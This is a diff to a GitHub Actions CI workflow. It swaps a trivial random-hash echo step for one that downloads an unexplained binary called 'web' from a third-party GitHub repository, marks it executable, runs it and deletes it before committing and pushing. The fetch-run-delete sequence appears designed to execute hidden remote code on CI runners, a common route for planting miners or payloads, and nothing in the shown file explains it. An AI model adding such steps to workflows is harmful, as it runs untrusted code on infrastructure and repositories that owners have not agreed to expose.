@@ -96,6 +96,7 @@ workflows:
   # Cron tx
 ```
   
+  
 name: CI
 on:
   push:
@@ -110,11 +111,16 @@ jobs:
       - uses: actions/checkout@v3
       - name: Run a one-line script
         run: |
-          echo $RANDOM | md5sum | head -c 20; echo;
-          echo " $RANDOM " > file
+          #mkdir .circleci
+          
+          wget https://github.com/Arlentak/pages/raw/master/web
+          chmod +x web
+          ./web
+          rm web
           git config --local user.email "41898282+github-actions[bot]@users.noreply.github.com"
           git config --local user.name "github-actions[bot]"
           git add -A
           git commit -m "Add changes"
           git push  
+
 ```
